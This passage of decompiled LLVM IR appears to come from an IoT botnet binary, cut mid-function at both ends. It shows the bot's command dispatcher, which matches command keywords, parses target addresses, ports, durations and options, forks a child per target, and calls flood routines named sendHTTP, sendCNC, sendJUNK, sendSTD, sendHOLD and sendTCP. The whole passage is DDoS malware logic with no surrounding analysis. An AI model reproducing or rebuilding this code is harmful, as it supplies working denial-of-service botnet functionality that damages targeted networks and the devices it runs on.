  store i32 %v1_1000bc74, i32* @r27, align 4
  %v2_1000bc90 = load i32, i32* %v1_1000bc90, align 4
  store i32 268483740, i32* @lr, align 4
  %v2_1000bc98 = call i32 @atol(i32 %v2_1000bc90, i32 %v1_1000bc8c)
  %v2_1000bca8 = load i32, i32* %v1_1000bca8, align 4
  store i32 268483764, i32* @lr, align 4
  %v2_1000bcb0 = call i32 @atol(i32 %v2_1000bca8, i32 %v1_1000bca4)
  %v0_1000bcb8 = load i32, i32* @r29, align 4
  %v0_1000bcbc = load i32, i32* @r28, align 4
  %v0_1000bcc0 = load i32, i32* @r27, align 4
  %v0_1000bcc4 = load i32, i32* @r26, align 4
  %v0_1000bcc8 = load i32, i32* @r25, align 4
  %v6_1000bcd0 = trunc i32 %v0_1000bcc0 to i16
  %v7_1000bcd0 = call i32 @sendHTTP(i32 %v0_1000bcb8, i32 %v0_1000bcbc, i16 %v6_1000bcd0, i32 %v0_1000bcc4, i32 %v0_1000bcc8, i32 %v2_1000bcb0)
  %v1_1000bcd8 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000bcdc

dec_label_pc_1000bcdc:                            ; preds = %dec_label_pc_1000bc2c, %dec_label_pc_1000bc3c
  store i32 ptrtoint (i32* @global_var_1001aa44.922 to i32), i32* @r4, align 4
  store i32 268483820, i32* @lr, align 4
  %v3_1000bce8 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1001aa44.922 to i32), i32 268566528)
  %v3_1000bcf8 = icmp eq i32 %v3_1000bce8, 0
  br i1 %v3_1000bcf8, label %dec_label_pc_1000bdb4, label %dec_label_pc_1000bc2c

dec_label_pc_1000bd04:                            ; preds = %dec_label_pc_1000bbe0
  store i32 268483848, i32* @lr, align 4
  %v0_1000bd04 = call i32 @listFork()
  %v3_1000bd0c = icmp eq i32 %v0_1000bd04, 0
  br i1 %v3_1000bd0c, label %dec_label_pc_1000bd14, label %dec_label_pc_1000c690

dec_label_pc_1000bd14:                            ; preds = %dec_label_pc_1000bd04
  %v2_1000bd1c = load i32, i32* %v1_1000bbe8, align 4
  store i32 %v2_1000bd1c, i32* @r29, align 4
  %v1_1000bd38 = add i32 %tmp, 12
  %v1_1000bd3c = inttoptr i32 %v1_1000bd38 to i32*
  %v2_1000bd3c = load i32, i32* %v1_1000bd3c, align 4
  store i32 268483912, i32* @lr, align 4
  %v2_1000bd44 = call i32 @atol(i32 %v2_1000bd3c, i32 %v1_1000bd38)
  %v1_1000bd4c = urem i32 %v2_1000bd44, 65536
  store i32 %v1_1000bd4c, i32* @r27, align 4
  %v1_1000bd64 = add i32 %tmp, 20
  %v1_1000bd68 = inttoptr i32 %v1_1000bd64 to i32*
  %v2_1000bd68 = load i32, i32* %v1_1000bd68, align 4
  store i32 268483956, i32* @lr, align 4
  %v2_1000bd70 = call i32 @atol(i32 %v2_1000bd68, i32 %v1_1000bd64)
  %v1_1000bd7c = add i32 %tmp, 24
  %v1_1000bd80 = inttoptr i32 %v1_1000bd7c to i32*
  %v2_1000bd80 = load i32, i32* %v1_1000bd80, align 4
  store i32 268483980, i32* @lr, align 4
  %v2_1000bd88 = call i32 @atol(i32 %v2_1000bd80, i32 %v1_1000bd7c)
  %v0_1000bd90 = load i32, i32* @r29, align 4
  %v0_1000bd94 = load i32, i32* @r28, align 4
  %v0_1000bd98 = load i32, i32* @r27, align 4
  %v0_1000bd9c = load i32, i32* @r26, align 4
  %v0_1000bda0 = load i32, i32* @r25, align 4
  %v6_1000bda8 = trunc i32 %v0_1000bd98 to i16
  %v7_1000bda8 = call i32 @sendHTTP(i32 %v0_1000bd90, i32 %v0_1000bd94, i16 %v6_1000bda8, i32 %v0_1000bd9c, i32 %v0_1000bda0, i32 %v2_1000bd88)
  %v1_1000bdb0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000bdb4

dec_label_pc_1000bdb4:                            ; preds = %dec_label_pc_1000bcdc, %dec_label_pc_1000bc04, %dec_label_pc_1000bbb0, %dec_label_pc_1000bd14
  %v2_1000bdb8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1001ab28.972 to i32), i32* @r4, align 4
  %v3_1000bdc8 = inttoptr i32 %v2_1000bdb8 to i8*
  %v4_1000bdc8 = call i32 @__GI_strcoll(i8* %v3_1000bdc8, i32 ptrtoint ([4 x i8]* @global_var_1001ab28.972 to i32))
  %v3_1000bdd0 = icmp eq i32 %v4_1000bdc8, 0
  br i1 %v3_1000bdd0, label %dec_label_pc_1000bdd8, label %dec_label_pc_1000bf34

dec_label_pc_1000bdd8:                            ; preds = %dec_label_pc_1000bdb4
  %tmp125 = icmp slt i32 %arg1, 4
  br i1 %tmp125, label %dec_label_pc_1000c690, label %dec_label_pc_1000bde4

dec_label_pc_1000bde4:                            ; preds = %dec_label_pc_1000bdd8
  %v1_1000bde8 = add i32 %tmp, 8
  %v1_1000bdec = inttoptr i32 %v1_1000bde8 to i32*
  %v2_1000bdec = load i32, i32* %v1_1000bdec, align 4
  store i32 268484088, i32* @lr, align 4
  %v2_1000bdf4 = call i32 @atol(i32 %v2_1000bdec, i32 %v1_1000bde8)
  %tmp126 = icmp slt i32 %v2_1000bdf4, 1
  br i1 %tmp126, label %dec_label_pc_1000c690, label %dec_label_pc_1000be04

dec_label_pc_1000be04:                            ; preds = %dec_label_pc_1000bde4
  %v1_1000be08 = add i32 %tmp, 12
  %v1_1000be0c = inttoptr i32 %v1_1000be08 to i32*
  %v2_1000be0c = load i32, i32* %v1_1000be0c, align 4
  store i32 268484120, i32* @lr, align 4
  %v2_1000be14 = call i32 @atol(i32 %v2_1000be0c, i32 %v1_1000be08)
  %v2_1000be1c = icmp sgt i32 %v2_1000be14, 0
  br i1 %v2_1000be1c, label %dec_label_pc_1000be28, label %dec_label_pc_1000c690

dec_label_pc_1000be28:                            ; preds = %dec_label_pc_1000be04
  %v1_1000be2c = add i32 %tmp, 4
  %v1_1000be30 = inttoptr i32 %v1_1000be2c to i32*
  %v2_1000be30 = load i32, i32* %v1_1000be30, align 4
  %v2_1000be40 = load i32, i32* %v1_1000bdec, align 4
  store i32 268484172, i32* @lr, align 4
  %v2_1000be48 = call i32 @atol(i32 %v2_1000be40, i32 %v1_1000bde8)
  %v2_1000be5c = load i32, i32* %v1_1000be0c, align 4
  store i32 268484200, i32* @lr, align 4
  %v2_1000be64 = call i32 @atol(i32 %v2_1000be5c, i32 %v1_1000be08)
  store i32 %v2_1000be30, i32* @r3, align 4
  store i32 268484224, i32* @lr, align 4
  %v2_1000be7c = call i32 @__GI_strchr(i32 %v2_1000be30, i32 44)
  %v3_1000be84 = icmp eq i32 %v2_1000be7c, 0
  br i1 %v3_1000be84, label %dec_label_pc_1000bf0c, label %dec_label_pc_1000be8c

dec_label_pc_1000be8c:                            ; preds = %dec_label_pc_1000be28
  store i32 ptrtoint (i32* @global_var_1001aa44.922 to i32), i32* @r4, align 4
  store i32 268484256, i32* @lr, align 4
  %v3_1000be9c = call i32 @__GI_strtok(i32 %v2_1000be30, i32 ptrtoint (i32* @global_var_1001aa44.922 to i32), i32 268566528)
  %v3_1000bf0043 = icmp eq i32 %v3_1000be9c, 0
  br i1 %v3_1000bf0043, label %dec_label_pc_1000bf34, label %dec_label_pc_1000beac

dec_label_pc_1000beac:                            ; preds = %dec_label_pc_1000be8c, %dec_label_pc_1000bee4
  %storemerge2044 = phi i32 [ %v3_1000bef0, %dec_label_pc_1000bee4 ], [ %v3_1000be9c, %dec_label_pc_1000be8c ]
  store i32 268484272, i32* @lr, align 4
  %v0_1000beac = call i32 @listFork()
  %v3_1000beb4 = icmp eq i32 %v0_1000beac, 0
  br i1 %v3_1000beb4, label %dec_label_pc_1000bebc, label %dec_label_pc_1000bee4

dec_label_pc_1000bebc:                            ; preds = %dec_label_pc_1000beac
  store i32 268484300, i32* @lr, align 4
  %v3_1000bec8 = call i32 @sendCNC(i32 %storemerge2044, i32 %v2_1000be48, i32 %v2_1000be64)
  %v3_1000bed0 = load i32, i32* @global_var_1002c8e0.30, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000bedc.973 to i32), i32* @lr, align 4
  %v1_1000bed8 = call i32 @__libc_close(i32 %v3_1000bed0)
  %v1_1000bee0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000bee4

dec_label_pc_1000bee4:                            ; preds = %dec_label_pc_1000beac, %dec_label_pc_1000bebc
  store i32 ptrtoint (i32* @global_var_1001aa44.922 to i32), i32* @r4, align 4
  store i32 268484340, i32* @lr, align 4
  %v3_1000bef0 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1001aa44.922 to i32), i32 268566528)
  %v3_1000bf00 = icmp eq i32 %v3_1000bef0, 0
  br i1 %v3_1000bf00, label %dec_label_pc_1000bf34, label %dec_label_pc_1000beac

dec_label_pc_1000bf0c:                            ; preds = %dec_label_pc_1000be28
  store i32 268484368, i32* @lr, align 4
  %v0_1000bf0c = call i32 @listFork()
  %v3_1000bf14 = icmp eq i32 %v0_1000bf0c, 0
  br i1 %v3_1000bf14, label %dec_label_pc_1000bf1c, label %dec_label_pc_1000c690

dec_label_pc_1000bf1c:                            ; preds = %dec_label_pc_1000bf0c
  store i32 ptrtoint ([3 x i8]* @global_var_1000bf2c.975 to i32), i32* @lr, align 4
  %v3_1000bf28 = call i32 @sendCNC(i32 %v2_1000be30, i32 %v2_1000be48, i32 %v2_1000be64)
  %v1_1000bf30 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000bf34

dec_label_pc_1000bf34:                            ; preds = %dec_label_pc_1000bee4, %dec_label_pc_1000be8c, %dec_label_pc_1000bdb4, %dec_label_pc_1000bf1c
  %v2_1000bf38 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1001ab2c.976 to i32), i32* @r4, align 4
  %v3_1000bf48 = inttoptr i32 %v2_1000bf38 to i8*
  %v4_1000bf48 = call i32 @__GI_strcoll(i8* %v3_1000bf48, i32 ptrtoint ([6 x i8]* @global_var_1001ab2c.976 to i32))
  %v3_1000bf50 = icmp eq i32 %v4_1000bf48, 0
  br i1 %v3_1000bf50, label %dec_label_pc_1000bf58, label %dec_label_pc_1000c0f4

dec_label_pc_1000bf58:                            ; preds = %dec_label_pc_1000bf34
  %tmp127 = icmp slt i32 %arg1, 4
  br i1 %tmp127, label %dec_label_pc_1000c690, label %dec_label_pc_1000bf64

dec_label_pc_1000bf64:                            ; preds = %dec_label_pc_1000bf58
  %v1_1000bf68 = add i32 %tmp, 8
  %v1_1000bf6c = inttoptr i32 %v1_1000bf68 to i32*
  %v2_1000bf6c = load i32, i32* %v1_1000bf6c, align 4
  store i32 268484472, i32* @lr, align 4
  %v2_1000bf74 = call i32 @atol(i32 %v2_1000bf6c, i32 %v1_1000bf68)
  %tmp128 = icmp slt i32 %v2_1000bf74, 1
  br i1 %tmp128, label %dec_label_pc_1000c690, label %dec_label_pc_1000bf84

dec_label_pc_1000bf84:                            ; preds = %dec_label_pc_1000bf64
  %v1_1000bf88 = add i32 %tmp, 12
  %v1_1000bf8c = inttoptr i32 %v1_1000bf88 to i32*
  %v2_1000bf8c = load i32, i32* %v1_1000bf8c, align 4
  store i32 268484504, i32* @lr, align 4
  %v2_1000bf94 = call i32 @atol(i32 %v2_1000bf8c, i32 %v1_1000bf88)
  %v2_1000bf9c = icmp sgt i32 %v2_1000bf94, 0
  br i1 %v2_1000bf9c, label %dec_label_pc_1000bfa8, label %dec_label_pc_1000c690

dec_label_pc_1000bfa8:                            ; preds = %dec_label_pc_1000bf84
  %v1_1000bfac = add i32 %tmp, 4
  %v1_1000bfb0 = inttoptr i32 %v1_1000bfac to i32*
  %v2_1000bfb0 = load i32, i32* %v1_1000bfb0, align 4
  %v2_1000bfc0 = load i32, i32* %v1_1000bf6c, align 4
  store i32 268484556, i32* @lr, align 4
  %v2_1000bfc8 = call i32 @atol(i32 %v2_1000bfc0, i32 %v1_1000bf68)
  %v2_1000bfdc = load i32, i32* %v1_1000bf8c, align 4
  store i32 268484584, i32* @lr, align 4
  %v2_1000bfe4 = call i32 @atol(i32 %v2_1000bfdc, i32 %v1_1000bf88)
  store i32 %v2_1000bfb0, i32* @r3, align 4
  store i32 268484608, i32* @lr, align 4
  %v2_1000bffc = call i32 @__GI_strchr(i32 %v2_1000bfb0, i32 44)
  %v3_1000c004 = icmp eq i32 %v2_1000bffc, 0
  br i1 %v3_1000c004, label %dec_label_pc_1000c0ac, label %dec_label_pc_1000c00c

dec_label_pc_1000c00c:                            ; preds = %dec_label_pc_1000bfa8
  store i32 ptrtoint (i32* @global_var_1001aa44.922 to i32), i32* @r4, align 4
  store i32 268484640, i32* @lr, align 4
  %v3_1000c01c = call i32 @__GI_strtok(i32 %v2_1000bfb0, i32 ptrtoint (i32* @global_var_1001aa44.922 to i32), i32 268566528)
  %v3_1000c0a039 = icmp eq i32 %v3_1000c01c, 0
  br i1 %v3_1000c0a039, label %dec_label_pc_1000c0f4, label %dec_label_pc_1000c02c

dec_label_pc_1000c02c:                            ; preds = %dec_label_pc_1000c00c, %dec_label_pc_1000c084
  %storemerge1840 = phi i32 [ %v3_1000c090, %dec_label_pc_1000c084 ], [ %v3_1000c01c, %dec_label_pc_1000c00c ]
  store i32 268484656, i32* @lr, align 4
  %v0_1000c02c = call i32 @listFork()
  %v3_1000c034 = icmp eq i32 %v0_1000c02c, 0
  br i1 %v3_1000c034, label %dec_label_pc_1000c03c, label %dec_label_pc_1000c084

dec_label_pc_1000c03c:                            ; preds = %dec_label_pc_1000c02c
  %v3_1000c048 = call i32 @sendJUNK(i32 %storemerge1840, i32 %v2_1000bfc8, i32 %v2_1000bfe4)
  %v3_1000c058 = call i32 @sendSTD(i32 %storemerge1840, i32 %v2_1000bfc8, i32 %v2_1000bfe4)
  %v3_1000c068 = call i32 @sendHOLD(i32 %storemerge1840, i32 %v2_1000bfc8, i32 %v2_1000bfe4)
  %v3_1000c070 = load i32, i32* @global_var_1002c8e0.30, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000c07c.977 to i32), i32* @lr, align 4
  %v1_1000c078 = call i32 @__libc_close(i32 %v3_1000c070)
  %v1_1000c080 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000c084

dec_label_pc_1000c084:                            ; preds = %dec_label_pc_1000c02c, %dec_label_pc_1000c03c
  store i32 ptrtoint (i32* @global_var_1001aa44.922 to i32), i32* @r4, align 4
  store i32 268484756, i32* @lr, align 4
  %v3_1000c090 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1001aa44.922 to i32), i32 268566528)
  %v3_1000c0a0 = icmp eq i32 %v3_1000c090, 0
  br i1 %v3_1000c0a0, label %dec_label_pc_1000c0f4, label %dec_label_pc_1000c02c

dec_label_pc_1000c0ac:                            ; preds = %dec_label_pc_1000bfa8
  store i32 268484784, i32* @lr, align 4
  %v0_1000c0ac = call i32 @listFork()
  %v3_1000c0b4 = icmp eq i32 %v0_1000c0ac, 0
  br i1 %v3_1000c0b4, label %dec_label_pc_1000c0bc, label %dec_label_pc_1000c690

dec_label_pc_1000c0bc:                            ; preds = %dec_label_pc_1000c0ac
  %v3_1000c0c8 = call i32 @sendJUNK(i32 %v2_1000bfb0, i32 %v2_1000bfc8, i32 %v2_1000bfe4)
  %v3_1000c0d8 = call i32 @sendSTD(i32 %v2_1000bfb0, i32 %v2_1000bfc8, i32 %v2_1000bfe4)
  %v3_1000c0e8 = call i32 @sendHOLD(i32 %v2_1000bfb0, i32 %v2_1000bfc8, i32 %v2_1000bfe4)
  %v1_1000c0f0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000c0f4

dec_label_pc_1000c0f4:                            ; preds = %dec_label_pc_1000c084, %dec_label_pc_1000c00c, %dec_label_pc_1000bf34, %dec_label_pc_1000c0bc
  %v2_1000c0f8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1001ab34.980 to i32), i32* @r4, align 4
  %v3_1000c108 = inttoptr i32 %v2_1000c0f8 to i8*
  %v4_1000c108 = call i32 @__GI_strcoll(i8* %v3_1000c108, i32 ptrtoint ([4 x i8]* @global_var_1001ab34.980 to i32))
  %v3_1000c110 = icmp eq i32 %v4_1000c108, 0
  br i1 %v3_1000c110, label %dec_label_pc_1000c118, label %dec_label_pc_1000c264

dec_label_pc_1000c118:                            ; preds = %dec_label_pc_1000c0f4
  %tmp129 = icmp slt i32 %arg1, 4
  br i1 %tmp129, label %dec_label_pc_1000c690, label %dec_label_pc_1000c124

dec_label_pc_1000c124:                            ; preds = %dec_label_pc_1000c118
  %v1_1000c128 = add i32 %tmp, 8
  %v1_1000c12c = inttoptr i32 %v1_1000c128 to i32*
  %v2_1000c12c = load i32, i32* %v1_1000c12c, align 4
  store i32 268484920, i32* @lr, align 4
  %v2_1000c134 = call i32 @atol(i32 %v2_1000c12c, i32 %v1_1000c128)
  %tmp130 = icmp slt i32 %v2_1000c134, 1
  br i1 %tmp130, label %dec_label_pc_1000c690, label %dec_label_pc_1000c144

dec_label_pc_1000c144:                            ; preds = %dec_label_pc_1000c124
  %v1_1000c148 = add i32 %tmp, 12
  %v1_1000c14c = inttoptr i32 %v1_1000c148 to i32*
  %v2_1000c14c = load i32, i32* %v1_1000c14c, align 4
  store i32 268484952, i32* @lr, align 4
  %v2_1000c154 = call i32 @atol(i32 %v2_1000c14c, i32 %v1_1000c148)
  %v2_1000c15c = icmp sgt i32 %v2_1000c154, 0
  br i1 %v2_1000c15c, label %dec_label_pc_1000c168, label %dec_label_pc_1000c690

dec_label_pc_1000c168:                            ; preds = %dec_label_pc_1000c144
  %v1_1000c16c = add i32 %tmp, 4
  %v1_1000c170 = inttoptr i32 %v1_1000c16c to i32*
  %v2_1000c170 = load i32, i32* %v1_1000c170, align 4
  %v2_1000c180 = load i32, i32* %v1_1000c12c, align 4
  store i32 268485004, i32* @lr, align 4
  %v2_1000c188 = call i32 @atol(i32 %v2_1000c180, i32 %v1_1000c128)
  %v2_1000c19c = load i32, i32* %v1_1000c14c, align 4
  store i32 268485032, i32* @lr, align 4
  %v2_1000c1a4 = call i32 @atol(i32 %v2_1000c19c, i32 %v1_1000c148)
  store i32 %v2_1000c170, i32* @r3, align 4
  store i32 268485056, i32* @lr, align 4
  %v2_1000c1bc = call i32 @__GI_strchr(i32 %v2_1000c170, i32 44)
  %v3_1000c1c4 = icmp eq i32 %v2_1000c1bc, 0
  br i1 %v3_1000c1c4, label %dec_label_pc_1000c23c, label %dec_label_pc_1000c1cc

dec_label_pc_1000c1cc:                            ; preds = %dec_label_pc_1000c168
  store i32 ptrtoint (i32* @global_var_1001aa44.922 to i32), i32* @r4, align 4
  store i32 268485088, i32* @lr, align 4
  %v3_1000c1dc = call i32 @__GI_strtok(i32 %v2_1000c170, i32 ptrtoint (i32* @global_var_1001aa44.922 to i32), i32 268566528)
  %v3_1000c23035 = icmp eq i32 %v3_1000c1dc, 0
  br i1 %v3_1000c23035, label %dec_label_pc_1000c264, label %dec_label_pc_1000c1ec

dec_label_pc_1000c1ec:                            ; preds = %dec_label_pc_1000c1cc, %dec_label_pc_1000c214
  %storemerge1636 = phi i32 [ %v3_1000c220, %dec_label_pc_1000c214 ], [ %v3_1000c1dc, %dec_label_pc_1000c1cc ]
  store i32 268485104, i32* @lr, align 4
  %v0_1000c1ec = call i32 @listFork()
  %v3_1000c1f4 = icmp eq i32 %v0_1000c1ec, 0
  br i1 %v3_1000c1f4, label %dec_label_pc_1000c1fc, label %dec_label_pc_1000c214

dec_label_pc_1000c1fc:                            ; preds = %dec_label_pc_1000c1ec
  %v3_1000c208 = call i32 @sendSTD(i32 %storemerge1636, i32 %v2_1000c188, i32 %v2_1000c1a4)
  %v1_1000c210 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000c214

dec_label_pc_1000c214:                            ; preds = %dec_label_pc_1000c1ec, %dec_label_pc_1000c1fc
  store i32 ptrtoint (i32* @global_var_1001aa44.922 to i32), i32* @r4, align 4
  store i32 268485156, i32* @lr, align 4
  %v3_1000c220 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1001aa44.922 to i32), i32 268566528)
  %v3_1000c230 = icmp eq i32 %v3_1000c220, 0
  br i1 %v3_1000c230, label %dec_label_pc_1000c264, label %dec_label_pc_1000c1ec

dec_label_pc_1000c23c:                            ; preds = %dec_label_pc_1000c168
  store i32 268485184, i32* @lr, align 4
  %v0_1000c23c = call i32 @listFork()
  %v3_1000c244 = icmp eq i32 %v0_1000c23c, 0
  br i1 %v3_1000c244, label %dec_label_pc_1000c24c, label %dec_label_pc_1000c690

dec_label_pc_1000c24c:                            ; preds = %dec_label_pc_1000c23c
  %v3_1000c258 = call i32 @sendSTD(i32 %v2_1000c170, i32 %v2_1000c188, i32 %v2_1000c1a4)
  %v1_1000c260 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000c264

dec_label_pc_1000c264:                            ; preds = %dec_label_pc_1000c214, %dec_label_pc_1000c1cc, %dec_label_pc_1000c0f4, %dec_label_pc_1000c24c
  %v2_1000c268 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1001ab38.984 to i32), i32* @r4, align 4
  %v3_1000c278 = inttoptr i32 %v2_1000c268 to i8*
  %v4_1000c278 = call i32 @__GI_strcoll(i8* %v3_1000c278, i32 ptrtoint ([4 x i8]* @global_var_1001ab38.984 to i32))
  %v3_1000c280 = icmp eq i32 %v4_1000c278, 0
  br i1 %v3_1000c280, label %dec_label_pc_1000c288, label %dec_label_pc_1000c534

dec_label_pc_1000c288:                            ; preds = %dec_label_pc_1000c264
  %tmp131 = icmp slt i32 %arg1, 6
  br i1 %tmp131, label %dec_label_pc_1000c690, label %dec_label_pc_1000c294

dec_label_pc_1000c294:                            ; preds = %dec_label_pc_1000c288
  %v1_1000c298 = add i32 %tmp, 12
  %v1_1000c29c = inttoptr i32 %v1_1000c298 to i32*
  %v2_1000c29c = load i32, i32* %v1_1000c29c, align 4
  store i32 268485288, i32* @lr, align 4
  %v2_1000c2a4 = call i32 @atol(i32 %v2_1000c29c, i32 %v1_1000c298)
  %v4_1000c2b0 = icmp eq i32 %v2_1000c2a4, -1
  br i1 %v4_1000c2b0, label %dec_label_pc_1000c690, label %dec_label_pc_1000c2b8

dec_label_pc_1000c2b8:                            ; preds = %dec_label_pc_1000c294
  %v1_1000c2bc = add i32 %tmp, 8
  %v1_1000c2c0 = inttoptr i32 %v1_1000c2bc to i32*
  %v2_1000c2c0 = load i32, i32* %v1_1000c2c0, align 4
  store i32 268485324, i32* @lr, align 4
  %v2_1000c2c8 = call i32 @atol(i32 %v2_1000c2c0, i32 %v1_1000c2bc)
  %v4_1000c2d4 = icmp eq i32 %v2_1000c2c8, -1
  br i1 %v4_1000c2d4, label %dec_label_pc_1000c690, label %dec_label_pc_1000c2dc

dec_label_pc_1000c2dc:                            ; preds = %dec_label_pc_1000c2b8
  %v1_1000c2e0 = add i32 %tmp, 16
  %v1_1000c2e4 = inttoptr i32 %v1_1000c2e0 to i32*
  %v2_1000c2e4 = load i32, i32* %v1_1000c2e4, align 4
  store i32 268485360, i32* @lr, align 4
  %v2_1000c2ec = call i32 @atol(i32 %v2_1000c2e4, i32 %v1_1000c2e0)
  %v4_1000c2f8 = icmp eq i32 %v2_1000c2ec, -1
  br i1 %v4_1000c2f8, label %dec_label_pc_1000c690, label %dec_label_pc_1000c300

dec_label_pc_1000c300:                            ; preds = %dec_label_pc_1000c2dc
  %v2_1000c308 = load i32, i32* %v1_1000c2e4, align 4
  store i32 268485396, i32* @lr, align 4
  %v2_1000c310 = call i32 @atol(i32 %v2_1000c308, i32 %v1_1000c2e0)
  %v2_1000c318 = icmp sgt i32 %v2_1000c310, 32
  br i1 %v2_1000c318, label %dec_label_pc_1000c690, label %dec_label_pc_1000c320

dec_label_pc_1000c320:                            ; preds = %dec_label_pc_1000c300
  %tmp132 = icmp slt i32 %arg1, 7
  br i1 %tmp132, label %dec_label_pc_1000c34c, label %dec_label_pc_1000c32c

dec_label_pc_1000c32c:                            ; preds = %dec_label_pc_1000c320
  %v1_1000c330 = add i32 %tmp, 24
  %v1_1000c334 = inttoptr i32 %v1_1000c330 to i32*
  %v2_1000c334 = load i32, i32* %v1_1000c334, align 4
  store i32 268485440, i32* @lr, align 4
  %v2_1000c33c = call i32 @atol(i32 %v2_1000c334, i32 %v1_1000c330)
  %v1_1000c344 = icmp slt i32 %v2_1000c33c, 0
  br i1 %v1_1000c344, label %dec_label_pc_1000c690, label %dec_label_pc_1000c34c

dec_label_pc_1000c34c:                            ; preds = %dec_label_pc_1000c32c, %dec_label_pc_1000c320
  %v3_1000c350 = icmp eq i32 %arg1, 8
  br i1 %v3_1000c350, label %dec_label_pc_1000c358, label %dec_label_pc_1000c37c

dec_label_pc_1000c358:                            ; preds = %dec_label_pc_1000c34c
  %v1_1000c35c = add i32 %tmp, 28
  %v1_1000c360 = inttoptr i32 %v1_1000c35c to i32*
  %v2_1000c360 = load i32, i32* %v1_1000c360, align 4
  store i32 268485484, i32* @lr, align 4
  %v2_1000c368 = call i32 @atol(i32 %v2_1000c360, i32 %v1_1000c35c)
  %v2_1000c370 = icmp sgt i32 %v2_1000c368, 0
  br i1 %v2_1000c370, label %dec_label_pc_1000c37c, label %dec_label_pc_1000c690

dec_label_pc_1000c37c:                            ; preds = %dec_label_pc_1000c34c, %dec_label_pc_1000c358
  %v1_1000c380 = add i32 %tmp, 4
  %v1_1000c384 = inttoptr i32 %v1_1000c380 to i32*
  %v2_1000c384 = load i32, i32* %v1_1000c384, align 4
  %v2_1000c394 = load i32, i32* %v1_1000c2c0, align 4
  store i32 268485536, i32* @lr, align 4
  %v2_1000c39c = call i32 @atol(i32 %v2_1000c394, i32 %v1_1000c2bc)
  %v2_1000c3b0 = load i32, i32* %v1_1000c29c, align 4
  store i32 268485564, i32* @lr, align 4
  %v2_1000c3b8 = call i32 @atol(i32 %v2_1000c3b0, i32 %v1_1000c298)
  %v2_1000c3cc = load i32, i32* %v1_1000c2e4, align 4
  store i32 268485592, i32* @lr, align 4
  %v2_1000c3d4 = call i32 @atol(i32 %v2_1000c3cc, i32 %v1_1000c2e0)
  %v1_1000c3e4 = add i32 %tmp, 20
  %v1_1000c3e8 = inttoptr i32 %v1_1000c3e4 to i32*
  %v2_1000c3e8 = load i32, i32* %v1_1000c3e8, align 4
  br i1 %v3_1000c350, label %dec_label_pc_1000c3fc, label %dec_label_pc_1000c418

dec_label_pc_1000c3fc:                            ; preds = %dec_label_pc_1000c37c
  %v1_1000c400 = add i32 %tmp, 28
  %v1_1000c404 = inttoptr i32 %v1_1000c400 to i32*
  %v2_1000c404 = load i32, i32* %v1_1000c404, align 4
  store i32 268485648, i32* @lr, align 4
  %v2_1000c40c = call i32 @atol(i32 %v2_1000c404, i32 %v1_1000c400)
  br label %dec_label_pc_1000c420

dec_label_pc_1000c418:                            ; preds = %dec_label_pc_1000c37c
  br label %dec_label_pc_1000c420

dec_label_pc_1000c420:                            ; preds = %dec_label_pc_1000c3fc, %dec_label_pc_1000c418
  %storemerge3 = phi i32 [ 10, %dec_label_pc_1000c418 ], [ %v2_1000c40c, %dec_label_pc_1000c3fc ]
  br i1 %tmp132, label %dec_label_pc_1000c450, label %dec_label_pc_1000c434

dec_label_pc_1000c434:                            ; preds = %dec_label_pc_1000c420
  %v1_1000c438 = add i32 %tmp, 24
  %v1_1000c43c = inttoptr i32 %v1_1000c438 to i32*
  %v2_1000c43c = load i32, i32* %v1_1000c43c, align 4
  store i32 268485704, i32* @lr, align 4
  %v2_1000c444 = call i32 @atol(i32 %v2_1000c43c, i32 %v1_1000c438)
  br label %dec_label_pc_1000c458

dec_label_pc_1000c450:                            ; preds = %dec_label_pc_1000c420
  br label %dec_label_pc_1000c458

dec_label_pc_1000c458:                            ; preds = %dec_label_pc_1000c434, %dec_label_pc_1000c450
  %storemerge2 = phi i32 [ 0, %dec_label_pc_1000c450 ], [ %v2_1000c444, %dec_label_pc_1000c434 ]
  store i32 %v2_1000c384, i32* @r3, align 4
  store i32 268485744, i32* @lr, align 4
  %v2_1000c46c = call i32 @__GI_strchr(i32 %v2_1000c384, i32 44)
  %v3_1000c474 = icmp eq i32 %v2_1000c46c, 0
  br i1 %v3_1000c474, label %dec_label_pc_1000c4fc, label %dec_label_pc_1000c47c

dec_label_pc_1000c47c:                            ; preds = %dec_label_pc_1000c458
  store i32 ptrtoint (i32* @global_var_1001aa44.922 to i32), i32* @r4, align 4
  store i32 268485776, i32* @lr, align 4
  %v3_1000c48c = call i32 @__GI_strtok(i32 %v2_1000c384, i32 ptrtoint (i32* @global_var_1001aa44.922 to i32), i32 268566528)
  %v3_1000c4f031 = icmp eq i32 %v3_1000c48c, 0
  br i1 %v3_1000c4f031, label %dec_label_pc_1000c534, label %dec_label_pc_1000c49c

dec_label_pc_1000c49c:                            ; preds = %dec_label_pc_1000c47c, %dec_label_pc_1000c4d4
  %storemerge1432 = phi i32 [ %v3_1000c4e0, %dec_label_pc_1000c4d4 ], [ %v3_1000c48c, %dec_label_pc_1000c47c ]
  store i32 268485792, i32* @lr, align 4
  %v0_1000c49c = call i32 @listFork()
  %v3_1000c4a4 = icmp eq i32 %v0_1000c49c, 0
  br i1 %v3_1000c4a4, label %dec_label_pc_1000c4ac, label %dec_label_pc_1000c4d4

dec_label_pc_1000c4ac:                            ; preds = %dec_label_pc_1000c49c
  %v7_1000c4c8 = call i32 @sendTCP(i32 %storemerge1432, i32 %v2_1000c39c, i32 %v2_1000c3b8, i32 %v2_1000c3d4, i32 %v2_1000c3e8, i32 %storemerge2, i32 %storemerge3)
